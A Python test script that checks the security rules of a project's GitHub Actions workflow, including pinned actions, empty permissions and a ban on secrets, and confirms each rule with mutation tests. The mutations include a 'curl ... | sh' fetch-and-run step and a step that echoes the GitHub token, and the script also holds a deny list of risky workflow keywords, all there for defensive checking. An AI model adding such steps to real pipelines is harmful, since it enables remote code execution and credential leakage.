#!/usr/bin/env python3
"""Assert the security rules of the public workflow .github/workflows/core-ci.yml.

Run: python3 development/test_public_workflow.py (needs PyYAML, from
requirements-dev). It checks the real file, then applies one mutation per rule
and fails if any mutation still passes, so a rule cannot be dropped in silence.
"""
import pathlib
import re
import sys

import yaml

ROOT = pathlib.Path(__file__).resolve().parent.parent
WORKFLOW = ROOT / ".github/workflows/core-ci.yml"
MAKEFILE = ROOT / "Makefile"
GUARD = "github.repository == 'ingotron-vault/robot-vault'"
PINNED = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
FORBIDDEN_TEXT = (
    "pull_request_target", "workflow_run", "self-hosted", "secrets.",
    "github.token", "actions/cache",
)


def check_deps():
    makefile = MAKEFILE.read_text(encoding="utf-8")
    match = re.search(r"^check:(.*)$", makefile, re.MULTILINE)
    return set(match.group(1).split()) if match else set()


def problems(text, check_targets):
    code = re.sub(r"(^|\s)#.*$", "", text, flags=re.MULTILINE)  # comments may name the rules
    found = [f"forbidden text {word!r}" for word in FORBIDDEN_TEXT if word in code]
    doc = yaml.safe_load(text)
    # PyYAML (YAML 1.1) reads the bare key `on` as True.
    triggers = doc.get("on", doc.get(True))
    if not isinstance(triggers, dict) or set(triggers) != {"pull_request", "push"}:
        found.append(f"triggers must be pull_request and push only: {triggers!r}")
    elif triggers["push"] != {"branches": ["main"]}:
        found.append(f"push must be to main only: {triggers['push']!r}")
    if doc.get("permissions") != {}:
        found.append("top-level permissions must be {}")
    concurrency = doc.get("concurrency") or {}
    if concurrency.get("cancel-in-progress") is not True or "github.ref" not in str(concurrency.get("group")):
        found.append("concurrency must cancel in progress per ref")
    jobs = doc.get("jobs") or {}
    if not jobs:
        found.append("no jobs")
    for name, job in jobs.items():
        where = f"job {name}:"
        if job.get("if") != GUARD:
            found.append(f"{where} missing repository guard")
        if job.get("runs-on") != "ubuntu-24.04":
            found.append(f"{where} runs-on must be ubuntu-24.04")
        if job.get("permissions") != {"contents": "read"}:
            found.append(f"{where} permissions must be contents: read")
        timeout = job.get("timeout-minutes")
        if not isinstance(timeout, int) or not 0 < timeout <= 120:
            found.append(f"{where} needs timeout-minutes 1..120")
        for key in ("container", "services", "env", "uses", "secrets"):
            if key in job:
                found.append(f"{where} {key} is not allowed")
        checkouts = 0
        for step in job.get("steps") or []:
            uses = step.get("uses")
            if uses is not None:
                if not PINNED.match(uses):
                    found.append(f"{where} action not pinned to a full SHA: {uses}")
                if uses.startswith("actions/checkout@"):
                    checkouts += 1
                    if (step.get("with") or {}).get("persist-credentials") is not False:
                        found.append(f"{where} checkout needs persist-credentials: false")
            run = step.get("run")
            if run is not None:
                words = run.split()
                if words[:1] != ["make"] or len(words) < 2:
                    found.append(f"{where} run must only call make targets: {run!r}")
                for target in words[1:]:
                    if target not in check_targets:
                        found.append(f"{where} {target} is not a prerequisite of make check")
            if "env" in step:
                found.append(f"{where} step env is not allowed")
        if checkouts != 1:
            found.append(f"{where} needs exactly one checkout step")
    return found


# One mutation per rule: (old text, new text). Each must produce a problem.
SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
MUTATIONS = [
    ("  pull_request:\n", "  pull_request_target:\n"),
    ("  pull_request:\n", "  pull_request:\n  workflow_dispatch:\n"),
    ("  pull_request:\n", "  pull_request:\n  workflow_run:\n    workflows: [x]\n"),
    ("    branches: [main]\n", "    branches: [main, dev]\n"),
    ("    branches: [main]\n", "    branches: [main]\n    tags: ['v*']\n"),
    ("permissions: {}\n", "permissions:\n  contents: read\n"),
    ("permissions: {}\n", ""),
    ("  cancel-in-progress: true\n", "  cancel-in-progress: false\n"),
    ("  group: ${{ github.workflow }}-${{ github.ref }}\n", "  group: fixed\n"),
    ("    if: github.repository == 'ingotron-vault/robot-vault'\n", ""),
    ("ingotron-vault/robot-vault'", "ingotron-vault/fork'"),
    ("    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-latest\n"),
    ("    runs-on: ubuntu-24.04\n", "    runs-on: [self-hosted, linux]\n"),
    ("      contents: read\n", "      contents: read\n      packages: write\n"),
    ("      contents: read\n", "      contents: write\n"),
    ("      contents: read\n", "      contents: read\n      id-token: none\n"),
    ("    timeout-minutes: 15\n", ""),
    (f"actions/checkout@{SHA} # v7.0.1", "actions/checkout@v7.0.1"),
    (f"actions/checkout@{SHA}", f"actions/checkout@{SHA[:12]}"),
    ("          persist-credentials: false\n", "          persist-credentials: true\n"),
    ("        with:\n          persist-credentials: false\n", ""),
    ("        run: make test-rust\n", "        run: make test-rust\n        env:\n          T: ${{ secrets.T }}\n"),
    ("        run: make test-rust\n", "        run: make test-rust\n      - uses: actions/cache@" + SHA + "\n"),
    ("        run: make test-rust\n", "        run: make test-rust\n      - run: echo ${{ github.token }}\n"),
    ("        run: make test-rust\n", "        run: curl https://example.invalid | sh\n"),
    ("        run: make test-rust\n", "        run: make test-release-images-live\n"),
    ("  rust:\n", "  rust:\n    container: ubuntu:24.04\n"),
    ("  rust:\n", "  rust:\n    services:\n      db:\n        image: postgres\n"),
    ("  rust:\n", "  rust:\n    uses: ./.github/workflows/reusable.yml\n"),
]


def main():
    text = WORKFLOW.read_text(encoding="utf-8")
    targets = check_deps()
    assert targets, "Makefile has no check: target"
    found = problems(text, targets)
    if found:
        print("core-ci.yml breaks the public CI rules:", *found, sep="\n  ", file=sys.stderr)
        return 1
    survivors = []
    for old, new in MUTATIONS:
        assert old in text, f"mutation anchor missing: {old!r}"
        if not problems(text.replace(old, new, 1), targets):
            survivors.append((old, new))
    if survivors:
        print("these mutations were not caught:", *map(repr, survivors), sep="\n  ", file=sys.stderr)
        return 1
    print(f"public workflow rules: ok ({len(MUTATIONS)} mutations caught)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
